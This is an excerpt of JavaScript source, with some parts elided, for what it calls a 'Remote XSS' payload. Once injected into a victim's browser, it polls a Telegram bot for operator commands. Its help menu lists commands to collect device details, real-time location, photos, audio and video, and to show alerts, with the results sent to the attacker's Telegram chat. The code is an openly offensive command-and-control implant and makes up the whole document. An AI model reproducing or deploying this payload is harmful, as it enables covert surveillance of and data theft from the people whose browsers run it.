...
try{
   tokenChatIDAndAddons = atob(parameters.get('val').slice(1)).split("|");
...
const downloadFile=async(fileID)=>{
    ...
    await fetch(`https://api.telegram.org/file/bot${token}/${file_path}`);
}
...
const request=async()=>{
    const response = await getBotUpdates(token);
    const result = response.result;
    const lastMessage = result[result.length -1];
    const updateID = lastMessage.update_id;

    const messageID = lastMessage.message.message_id;
    const time = lastMessage.message.date*1000;
    const content = lastMessage.message.text;
    const messageChatID = lastMessage.message.chat.id;

    

    if(messageChatID == chatID && startingTime<time && lastUpdateId!=updateID){
        if(content == "details"){
            const collectBasicDetails = new BasicDetailsClass(token,chatID);
            collectBasicDetails.collectData();
        }
            ...
            const videoRecord = new VideoClass(token,chatID) 
            videoRecord.collectData();
        }
        else if(content.split(" ")[0] == "alert"){
            const textToShow = content.split(" ").slice(1).join(" ");
            const basic = new BasicDetailsClass();
            await basic.sendTextToTelegram(`showing alert : ${textToShow}`);
            alert(textToShow);
        }
        else if(content == "stop"){
            const basic = new BasicDetailsClass();
            await basic.sendTextToTelegram(`Stopping Remote XSS`)
            clearInterval(pollingInstance);
        }
        else if(content == "help"){
            const basic = new BasicDetailsClass();
            const helpOptions = `
            details - Get Basic Details\nlocation - Get realtime Location\nphoto - Take Photo\naudio - Collect Audio\nvideo - Take Video\nalert [message] - Show alert\nstop - stop connection\nhelp - show this menu 
            `
            await basic.sendTextToTelegram(helpOptions)
        }
        else{
            const basic = new BasicDetailsClass();
            await basic.sendTextToTelegram(`Unknown Command!!`)
        }
    }
    lastUpdateId = updateID;

    await fetch(`https://api.telegram.org/bot${token}/getUpdates?timeout=10&offset=${updateID}`)
}

const polling=async()=>{
    const basic = new BasicDetailsClass();
    await basic.sendTextToTelegram(`Started Remote XSS , polling : ${Number(tokenChatIDAndAddons[2])}seconds`)
    pollingInstance =setInterval(request, Number(tokenChatIDAndAddons[2]*1000));
}
polling();
